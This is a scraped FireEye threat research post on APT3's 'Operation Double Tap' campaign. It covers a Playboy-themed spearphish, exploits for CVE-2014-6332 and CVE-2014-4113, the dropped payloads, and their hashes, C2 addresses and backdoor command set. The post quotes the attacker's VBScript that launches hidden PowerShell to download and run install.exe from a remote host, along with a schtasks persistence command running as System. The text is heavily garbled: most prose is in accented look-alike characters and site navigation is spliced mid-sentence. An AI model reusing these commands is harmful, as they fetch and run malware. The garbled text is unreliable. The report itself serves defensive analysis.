{
    "title": "operation double tap _ fireeye inc",
    "text": "Țħřěǻț Řěșěǻřčħ\nǾpěřǻțįǿň Đǿ ųbŀě Țǻp\nŇǿvěmbě ř 21, 2014 | bỳ Ňěđ Mǿřǻň, Mįķě Șčǿțț , Mįķě Ǿppěňħěįm , Jǿșħųǻ Ħǿmǻň\nĚXPĿǾİȚȘ \nǺĐVǺŇČĚĐ MǺĿẄǺŘ Ě \nȚĦŘĚǺȚ ŘĚȘĚǺŘČĦ\nǺPȚ3 (ǻŀșǿ ķňǿẅň ǻș ŲPȘ), țħě ǻčțǿ řș řěșpǿňșįbŀě fǿř Ǿpěřǻțįǿň Čŀǻň đěșțįňě Fǿx  ħǻș qųįěțŀỳ čǿňțįň ųěđ țǿ șěňđ\nẅǻvěș ǿf șpěǻřpħįșħįňģ mě șșǻģěș ǿvěř țħě pǻ șț fěẅ mǿňțħ ș. Țħįș ǻčțǿř įňįțįǻțě đ țħěįř mǿșț řěčěňț čǻmpǻįģň ǿň\nŇǿvěmbě ř 19, 2014 țǻřģěțįňģ m ųŀțįpŀě ǿřģǻňįżǻțįǿňș. Țħě ǻțțǻčķě ř ŀěvěřǻģěđ mųŀțįpŀě ěxpŀǿįț ș, țǻřģěțįňģ\nbǿțħ ČVĚ-2014-6332  ǻňđ ČVĚ-2014-4113. ČVĚ-2014-6332  ẅǻș đįșčŀǿșěđ pųbŀįčŀỳ ǿň 2014-11-11 ǻňđ įș ǻ Ẅįňđǿẅș\nǾĿĚ Ǻųțǿmǻțįǿň Ǻ řřǻỳ Řěmǿțě Čǿ đě Ěxěčųțįǿň vųŀňěřǻbįŀįțỳ. ČV Ě-2014-4113 įș ǻ přįvįŀěģě ě șčǻŀǻțįǿň v ųŀňěřǻbįŀįțỳ\nțħǻț ẅǻș đįșčŀǿșěđ pųbŀįčŀỳ ǿň 2014-10-14.\nȚħě ųșě ǿf ČV Ě-2014-6332  įș ňǿțǻbŀě, ǻ ș įț đěmǿňșțřǻțěș țħǻț m ųŀțįpŀě čŀǻ șșěș ǿf ǻčțǿ řș, bǿțħ č řįmįňǻŀ ǻň đ ǺPȚ\nǻŀįķě, ħǻvě ňǿ ẅ įňčǿřpǿřǻțěđ țħįș ěxpŀǿįț įňțǿ țħěį ř țǿǿŀķįțș. Fųřțħěř, țħě ųșě ǿf bǿțħ ǿf țħě șě țẅǿ ķňǿẅň\nvųŀňěřǻbįŀįțįěș įň țǻňđěm įș ňǿțǻbŀě fǿ ř ǺPȚ3. Țħįș ǻčțǿř įș ħįșțǿřįčǻŀŀỳ ķňǿ ẅň fǿř ŀěvěřǻģįňģ żěřǿ-đǻỳ\nvųŀňěřǻbįŀįțįěș įň ẅįđěșpřěǻđ bųț įňfřěqųěňț pħįșħįňģ čǻmpǻįģň ș. Țħě ųșě ǿf ķňǿ ẅň ěxpŀǿįț ș ǻňđ mǿřě fřěqųěňț\nǻțțǻčķș mǻỳ įň đįčǻțě bǿțħ ǻ șħįfț įň șțřǻțěģỳ ǻň đ ǿpěřǻțįǿňǻŀ țěmpǿ fǿ ř țħįș ģřǿųp.\nȚħě Șpěǻ řpħįșħ\nȚħě bǿđỳ ǿf țħě mě șșǻģě įș běŀǿẅ:\nǾňě Mǿňțħ' ș Fřěě Měmbě řșħįp fǿř Țħě PĿǺỲBǾỲ ČŀŲB 1080 P ĦĐ VİĐĚǾȘ 100,000 PĦǾȚǾȘ 4, 000  MǾĐĚĿȘ\nŇųđě Čěŀěb řįțįěș,Pŀǻỳmǻțě ș,Čỳběřģįřŀș & Mǿřě! Čŀįčķ ħxxp://jǿįň.pŀǻỳbǿỳ șpŀųș.čǿm/șįģňųp/ Țǿ Ģěț ǻ F řěě Pŀųș\nMěmbě ř Ňǿẅ & Ňěvěř Mįșș Ǻňǿțħě ř Ųpđǻțě. Ỳǿųř Měmbě ř řěfěřřǻŀș mųșț řěmǻįň ǻčțįvě. İf ǻňỳǿňě ģěțțįňģ\n\"Přǿmǿțįǿň ňǿț ǻvǻįŀǻbŀě\" fǿ ř 1 mǿňțħ f řěě měmbě řșħįp, ỳǿų mįģħț ģěț țħě į șșųě ųp țǿ 48 ħřș ǿňčě ỳǿ ųř\nměmbě řșħįp įș ěxpįřěđ ǻňđ mǻķě șųřě țǿ Čŀěǻ ř ǿųț čǿǿķįě ș ǿř ųșě ǻňǿțħě ř břǿẅșěř ǿř ųșě ǻňǿțħě ř PČ.\nȚħě ẅěbpǻģě čǿňțǻįňě đ bǿțħ ČV Ě-2014-6332  ěxpŀǿįț čǿ đě ǻňđ ǻ VBȘč řįpț țħǻț įňvǿķě đ PǿẅěřȘħěŀŀ ǿň țħě\nǻffěčțěđ ųșěřș’ șỳșțěm țǿ đǿẅňŀǿǻđ țħě běŀǿ ẅ pǻỳŀǿǻ đ:\n    function runmumaa()\n    On Error Resume Next\n    set shell=createobject(\"Shell.Application\")\n    shell.ShellExecute \"powershell.exe\",\"-NoLogo -NoProfile                 -NonInteractive -WindowStyle\nHidden ( New-Object                        \n“System.Net.WebClient”).DownloadFile(“http://www.playboysplus.com       \n/install/install.exe”,”install.exe”);Invoke-Item install.exe\", \"\",         \"open\", 1\n    end function\nȚħě ČV Ě-2014-6332  ěxpŀǿįț čǿ đě șěěň įň țħį ș įňčįđěňț įș đěřįvěđ fřǿm țħě čǿ đě pųbŀįșħěđ ǻț ħțțp://ẅẅẅ .ěxpŀǿįț-\nđb.čǿm/ěxpŀǿįț ș/35230 /, ẅħįčħ ħǻș ǻŀșǿ běěň įňčǿ řpǿřǻțěđ įň țħě Měțǻ șpŀǿįț přǿjěčț.\nȚħě Đǿ ẅňŀǿǻđěř\nǺfțěř țħě ěxpŀǿįț ǿ ř șčřįpț ěxěč ųțěș, țħě șỳșțěm đǿẅňŀǿǻđș install.exe,  ẅħįčħ ħǻș țħě fǿŀŀǿ ẅįňģ měțǻ đǻțǻ:\nMD5             5a0c4e1925c76a959ab0588f683ab437\nSize            46592 bytes\nCompile Time    2014-11-19 08:55:10Z\nImport Hash     6b8611f8148a6b51e37fd68e75b6a81c\nȚħě fįŀě install.exe  ǻțțěmpț ș țǿ ẅřįțě țẅǿ fįŀěș (đǿč.ěxě ǻň đ țěșț.ěxě) țǿ țħě ħǻ řđ-čǿđěđ pǻțħ\n“C:\\Users\\Public”,  ẅħįčħ fǻįŀ ș ǿň Ẅįň đǿẅș XP běčǻ ųșě țħǻț pǻțħ į ș ňǿț přěșěňț bỳ đěfǻųŀț.\nȚħě fįřșț đřǿppěđ fįŀě, doc.exe,  čǿňțǻįň ș țħě ČV Ě-2014-4113 ěxpŀǿįț ǻň đ țħěň ǻțțěmpț ș țǿ ěxěč ųțě test.exe  ẅįțħ\nțħě ěŀěvǻțě đ přįvįŀěģěș. Țħěșě fįŀěș ħǻvě țħě fǿŀŀǿ ẅįňģ měțǻ đǻțǻ:\ndoc.exe (x86):\nMD5           492a839a3bf9c61b7065589a18c5aa8d\nSize          12288 bytes\nImport Hash   9342d18e7d315117f23db7553d59a9d1\n \ndoc.exe (x64):\nMD5           744a17a3bc6dbd535f568ef1e87d8b9a\nSize          13824 bytes\nCompile Time  2014-11-19 08:25:45Z\nImport Hash   2fab77a3ff40e4f6d9b5b7e813c618e4\n \ntest.exe:\nMD5           5c08957f05377004376e6a622406f9aa\nSize          11264 bytes\nCompile Time  2014-11-18 10:49:23Z\nImport Hash   f34d5f2d4577ed6d9ceec516c1f5a744\n \nȚħěșě pǻỳŀǿǻ đ fįŀěș ǻŀșǿ ħǻvě įňțě řěșțįňģ PĐB đěbųģ șțřįňģș.\ninstall.exe:\n    c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\MShell\\Release        \\MShell.pdb\n \ndoc.exe:\n    c:\\Users\\aa\\Documents\\Visual Studio 2008\\Projects\\4113\\Release            \\4113.pdb\n \ntest.exe:\n    C:\\Users\\aa\\Documents\\Visual Studio 2010\\Projects\\MyRat\\Client\\Client     \n\\obj\\x86\\Release\\Client.pdb\n \nȚħě mǿ șț įňțěřěșțįňģ PĐB șțřįňģ įș țħě “4113.pdb,”  ẅħįčħ ǻppěǻ řș țǿ řěfěřěňčě ČV Ě-2014-4113. Țħįș ČVĚ įș ǻ ŀǿčǻŀ\nķěřňěŀ vųŀňěřǻbįŀįțỳ țħǻț, ẅįțħ șųččěșșfųŀ ěxpŀǿįțǻțįǿň, ẅǿųŀđ ģįvě ǻňỳ ųșěř ȘỲȘȚĚM ǻččěșș ǿň țħě mǻčħįňě.\nȚħě mǻŀ ẅǻřě čǿmpǿňěňț, test.exe , ųșěș țħě Ẅįň đǿẅș čǿmmǻň đ \"cmd.exe\" /C whoami”  țǿ věřįfỳ įț įș řųňňįňģ\nẅįțħ țħě ěŀěvǻțě đ přįvįŀěģěș ǿf “Șỳșțěm” ǻň đ čřěǻțěș pěřșįșțěňčě bỳ č řěǻțįňģ țħě fǿŀŀǿ ẅįňģ șčħěđųŀěđ țǻșķ:\n    schtasks /create /tn \"mysc\" /tr C:\\Users\\Public\\test.exe /sc ONLOGON     /ru \"System\"\nẄħěň ěxěč ųțěđ, țħě mǻŀ ẅǻřě fįřșț ěșțǻbŀįșħěș ǻ ȘǾČĶȘ 5 čǿňňěčțįǿň țǿ 192.157.198.103 ųșįňģ ȚČP pǿ řț 1913. Țħě\nmǻŀẅǻřě șěňđș țħě ȘǾČĶȘ 5 čǿňňěčțįǿň řěqųěșț \"05 01 00\"  ǻňđ věřįfįěș țħě șěřvěř řěșpǿňșě șțǻřțș ẅįțħ \"05 00\".\nȚħě mǻŀ ẅǻřě țħěň řěqųěșțș ǻ čǿňňěčțįǿň țǿ 192.184.60.229 ǿň ȚČP pǿ řț 81 ųșįňģ țħě čǿmmǻň đ \"05 01 00 01 c0 \nĚmǻįŀ Ųp đǻțěș\nİňfǿřmǻțįǿň ǻň đ įňșįģħț ǿň țǿ đǻỳ'ș\nǻđvǻňčěđ țħřěǻțș fřǿm FįřěĚỳě.\nȘĦǺŘĚ\nŘěčěňț Pǿ șțș\n09 Mǻř 2020\n24 Fěb 2020\n20 Fěb 2020\nŘȘȘ FĚĚĐ: ȘȚǺỲ ČǾ ŇŇĚČȚĚĐFįřșț Ňǻmě Ŀǻșț Ňǻmě\nĚmǻįŀ Ǻđđřěșș\nČǿmpǻňỳ Ňǻmě\nȚħřěǻț Řěșěǻřčħ Bŀǿģ\nFįřěĚỳě Șțǿřįěș Bŀǿģ\nİňđųșțřỳ Pěřșpěčțįvě ș Bŀǿģ\nỲěș, İ ẅǿųŀđ ŀįķě țǿ řěčěįvě\nčǿmmųňįčǻțįǿň ș fřǿm FįřěĚỳě.\nPŀěǻșě řěǻđ mǿřě ǻbǿųț ǿųř\nįňfǿřmǻțįǿň čǿŀŀěčțįǿň ǻň đ ųșě.\nȘŲBȘČŘ İBĚ\nČřěșčěňđǿ: Řěǻŀ Țįmě Ěvěňț Vįě ẅěř\nfǿř mǻčǾȘ  \nŘǻňșǿmẅǻřě Ǻģǻįň șț țħě Mǻčħįňě:\nĦǿẅ Ǻđvěřșǻřįěș ǻřě Ŀěǻřňįňģ țǿ\nĐįșřųpț İňđųșțřįǻŀ Přǿđųčțįǿň bỳ\nȚǻřģěțįňģ İȚ ǻňđ ǾȚ \nM-Țřěňđș 2020 : İňșįģħțș Fřǿm țħě\nFřǿňț Ŀįňě ș \n\nĦǿmě  FįřěĚỳě Bŀǿģ ș Țħřěǻț Řěșěǻřčħ  Ňǿvěmbě ř 2014 Țħřěǻț Řěșěǻřčħ Bŀǿģ Pǿ șțș  Ǿpěřǻțįǿň Đǿ ųbŀě Țǻp    \nČǾŇȚǺČȚ ŲȘ  ŘĚPǾŘȚ Ǻ Ň İŇČİĐĚŇȚ\nȘǿŀųțįǿňș Șěřvįčěș Čųșțǿměřș Pǻřțňěřș Řěșǿųřčěș Čǿmpǻňỳ\n  PŘĚVİǾŲȘ PǾȘȚ ŇĚXȚ PǾȘȚb8 3c e5 00 51\"  ǻňđ věřįfįěș țħǻț țħě fį řșț țẅǿ bỳțěș fřǿm țħě șěřvěř ǻřě \"05 00\" (č0 b8 3č ě5 įș țħě İP ǻđđřěșș\nǻňđ 00 51 įș țħě pǿ řț įň ňěțẅǿřķ bỳțě ǿ řđěř).\nǾňčě țħě čǿňňěčțįǿň țǿ țħě șěřvěř įș ěșțǻbŀįșħěđ, țħě mǻŀ ẅǻřě ěxpěčț ș ǻ měșșǻģě čǿňțǻįňįňģ ǻț ŀěǻ șț țħřěě bỳțě ș\nfřǿm țħě șěřvěř. Țħěșě fįřșț țħřěě bỳțě ș ǻřě țħě čǿmmǻň đ įđěňțįfįěř. Țħě fǿŀŀǿ ẅįňģ čǿmmǻň đș ǻřě șųppǿřțěđ bỳ\nțħě mǻŀ ẅǻřě:\nČǿmmǻň đ\nİĐĐěșčřįpțįǿň\n00 00 00Čǿňțěňț ǻfțě ř čǿmmǻň đ İĐ įș ẅřįțțěň țǿ:\nČ:\\Ųșěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňǿțěpǻ đ1.ěxě\n00 00 01Đěŀěțěș țħě fįŀě ș:\nČ:\\Ųșěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňǿțěpǻ đ.ěxě\nČ:\\Ųșěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňě ẅňǿțěpǻ đ.ěxě\n00 00 02 Mǻŀẅǻřě ěxįțș\n00 00 03Mǻŀẅǻřě đǿẅňŀǿǻđș țħě ŲŘĿ țħǻț fǿŀŀǿ ẅș țħě\nčǿmmǻň đ İĐ. Țħě fįŀě į ș șǻvěđ țǿ:\nČ:\\Ųșěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňǿțěpǻ đ.ěxě\n00 00 04Čǿňțěňț ǻfțě ř čǿmmǻň đ İĐ įș ẅřįțțěň țǿ:\nČ:\\Ųșěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňǿțěpǻ đ2.ěxě\n00 00 05Țħě fįŀěș ňǿțěpǻ đ1.ěxě ǻň đ ňǿțěpǻ đ2.ěxě ǻřě\nčǿňčǻțěňǻțě đ țǿģěțħě ř ǻňđ ẅřįțțěň țǿ Č:\\Ų șěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňě ẅňǿțěpǻ đ.ěxě\nǻňđ ěxěčųțěđ\n00 00 06Țħě čǿňțěňț ș ǿf țħě fǿŀŀǿ ẅįňģ fįŀě į ș șěňț țǿ țħě\nșěřvěř:\nČ:\\Ųșěřș\\\n[Ųșěřňǻmě]\\ǺppĐǻțǻ\\Ŀǿčǻŀ\\Țěmp\\ňǿțě.țxț\n00 00 07Țħě șțřįňģ fǿŀŀǿ ẅįňģ țħě čǿmmǻň đ İĐ įș ěxěčųțěđ\nųșįňģ \"čm đ /Č\" ǻňđ řěșųŀțș ǻřě șěňț țǿ șěřvěř\n \nĿįňķș țǿ ǺPȚ 3\nǾň Ǿčțǿbě ř 28, ẅě ǿbșěřvěđ ǺPȚ3 șěňđįňģ ǿųț șpěǻřpħįșħįňģ mě șșǻģěș čǿňțǻįňįňģ ǻ čǿmp řěșșěđ ěxěčųțǻbŀě\nǻțțǻčħměňț. Țħě đěfŀǻțěđ ěxě ẅǻș ǻ vǻřįǻňț ǿf țħě șǻmě đǿẅňŀǿǻđěř đěșčřįběđ ǻbǿvě ǻň đ čǿňňěčțě đ țǿ\n198.55.115.71  ǿvěř pǿřț 1913 vįǻ ȘǾČĶȘ 5 přǿxỳ. Țħě șěčǿňđǻřỳ pǻỳŀǿǻ đ įň țħǻț čǻ șě ẅǻș đěțěčțěđ ǻș\nBǻčķđǿǿř.ǺPȚ.ČǿǿķįěČ ųțțěř (ǻķǻ Pį řpį) ǻňđ ǻŀșǿ ňǻmě đ ňěẅňǿțěpǻ đ.ěxě (MD5\n8849538ef1c3471640230605c2623c67)  ǻňđ čǿňňěčțě đ țǿ țħě ķňǿ ẅň ǺPȚ3 đǿmǻįňș:\n    inform.bedircati[.]com\n    pn.lamb-site[.]com\n    210.109.99.64\nȚħě 192.184.60.229  İP ǻđđřěșș șěěň įň țħį ș čųřřěňț čǻmpǻįģň ǻŀ șǿ ħǿșțș securitywap[.]com  – ǻňǿțħě ř ķňǿẅň\nđǿmǻįň řěfěřěňčěđ įň ǿųř Ǿpěřǻțįǿň Čŀǻň đěșțįňě Fǿx bŀǿģ.\nĐǾMǺİŇ FİŘȘȚ ȘĚĚŇ ĿǺȘȚ Ș ĚĚŇİP ǺĐĐŘ ĚȘȘ\nșěčųřįțỳẅǻp.čǿm 2014-11-172014-11-20192.184.60.229\nẅẅẅ .șěčųřįțỳẅǻp.čǿm 2014-11-172014-11-20192.184.60.229\nİň ǻđđįțįǿň, țħě join.playboysplus[.]com  ěxpŀǿįț ǻň đ pǻỳŀǿǻ đ đěŀįvěřỳ șįțě řěșǿŀvěș țǿ 104.151.248.173.\nȚħįș İP ħǻș ħǿșțěđ ǿțħěř đǿmǻįňș ųșěđ bỳ ǺPȚ 3 įň pǻșț čǻmpǻįģň ș:\nĐǾMǺİŇ FİŘȘȚ ȘĚĚŇ ĿǺȘȚ Ș ĚĚŇİP ǺĐĐŘ ĚȘȘ\njǿįň.pŀǻỳbǿỳ șpŀųș[.]čǿm 2014-11-212014-11-21104.151.248.173\nẅǻŀțěřčŀěǻň[.]čǿm 2014-11-182014-11-20104.151.248.173\nẅẅẅ .ẅǻŀțěřčŀěǻň[.]čǿm 2014-11-182014-11-20104.151.248.173\nǺș ẅě đįșčųșșěđ įň ǿųř přěvįǿųș bŀǿģ đěțǻįŀįňģ přěvįǿųș ǺPȚ3 ǻčțįvįțỳ , țħě walterclean[.]com  șěřvěđ ǻș ǻ\nPŀųģx/Ķǻbǻ čǿmmǻň đ ǻňđ čǿňțřǿŀ șěřvěř.\nČǿňčŀųșįǿň\nǺŀțħǿųģħ ǺPȚ 3 įș ẅěŀŀ ķňǿẅň fǿř ěmpŀǿỳįňģ żěřǿ-đǻỳ ěxpŀǿįț ș įň țħěįř ǻțțǻčķș, řěčěňț ǻčțįvįțỳ ħǻ ș đěmǿňșțřǻțěđ\nțħǻț țħěỳ ẅįŀŀ ǻŀșǿ ǻțțǻčķ țǻ řģěțș ẅįțħ ķňǿẅň ěxpŀǿįț ș ǿř șǿčįǻŀ ěňģįňěě řįňģ.\nȘįňčě Ǿpě řǻțįǿň Čŀǻň đěșțįňě Fǿx, ẅě ħǻvě ǿb șěřvěđ țħįș ǻčțǿř ěxěčųțě mųŀțįpŀě ǻțțǻčķ ș țħǻț đįđ ňǿț řěŀỳ ǿň\nżěřǿ-đǻỳ ěxpŀǿįț ș. Țħě čǿmbįňǻțįǿň ǿf țħį ș șųșțǻįňěđ ǿpěřǻțįǿňǻŀ țěmpǿ ǻň đ ŀǻčķ ǿf żěřǿ-đǻỳ ěxpŀǿįț ș mǻỳ\nįňđįčǻțě țħǻț țħį ș ģřǿųp ħǻș čħǻňģě đ șțřǻțěģỳ ǻň đ ħǻș đěčįđěđ țǿ ǻțțǻčķ mǿ řě fřěqųěňțŀỳ ǻň đ đǿěș ňǿț ħǻvě\nșțěǻđỳ ǻččěșș țǿ żěřǿ-đǻỳ ěxpŀǿįț čǿ đě. Ňǿ mǻțțě ř țħě șțřǻțěģỳ, țħį ș ǻčțǿř ħǻș șħǿẅň ǻň ǻbįŀįțỳ țǿ ǿpě řǻțě\nșųččěșșfųŀŀỳ.\nİǾČș fǿř țħįș țħřěǻț čǻň bě fǿ ųňđ ħěřě.\n \nČǿmpǻňỳ\nẄħỳ Fį řěĚỳě?\nČųșțǿměř Șțǿřįěș\nČǻřěěřș\nČěřțįfįčǻțįǿň ș ǻňđ Čǿmpŀįǻňčě\nİňvěșțǿř Řěŀǻțįǿň ș\nȘųppŀįěř Đǿčųměňțș\nŇěẅș ǻňđ Ěvěňțș\n Ňěẅșřǿǿm\nPřěșș Řěŀěǻșěș\nẄěbįňǻ řș\nĚvěňțș\nǺẅǻřđș ǻňđ Ħǿňǿřș\nĚmǻįŀ Přěfěřěňčěș\nȚěčħňįčǻŀ Ș ųppǿřț\nİňčįđěňț?\nŘěpǿřț Șěčųřįțỳ İșșųě\nČǿňțǻčț Ș ųppǿřț\nČųșțǿměř Pǿřțǻŀ\nČǿmmųňįțįěș\nĐǿčųměňțǻțįǿň Pǿ řțǻŀ\nFįřěĚỳě Bŀǿģ ș\nȚħřěǻț Řěșěǻřčħ\nFįřěĚỳě Șțǿřįěș\nİňđųșțřỳ Pěřșpěčțįvě ș\nȚħřěǻț Mǻp\nVįěẅ țħě Ŀǻțě șț Țħřěǻțș\nČǿňțǻčț Ų ș\n+1 877-347-3393\n \nȘțǻỳ Čǿňňěčțě đ\n\nČǿpỳřįģħț © 2020  FįřěĚỳě, İňč. Ǻŀŀ řįģħțș řěșěřvěđ. \nPřįvǻčỳ & Čǿǿķįě ș Pǿŀįčỳ  | Přįvǻčỳ Șħįěŀ đ | Ŀěģǻŀ Đǿč ųměňțǻțįǿňȘįțě Ŀǻňģ ųǻģě\nĚňģŀįșħ\n "
}